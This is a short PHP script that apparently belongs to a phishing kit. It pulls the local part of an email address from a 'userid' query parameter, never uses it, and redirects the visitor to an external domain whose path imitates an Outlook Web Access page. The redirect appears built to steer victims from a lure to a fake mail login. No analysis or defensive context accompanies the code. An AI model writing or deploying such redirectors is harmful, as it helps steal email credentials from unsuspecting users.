<?php
function getuseridIDFromuserid($userid)
{
$find = '@';
$pos = strpos($userid, $find);
$userID = substr($userid, 0, $pos);
return $userID;
}
$userid = $_GET['userid'];
$userID = getuseridIDFromuserid($userid);
header("Location: http://cargoel.com/owa/20200603-OWA EXP");
?>
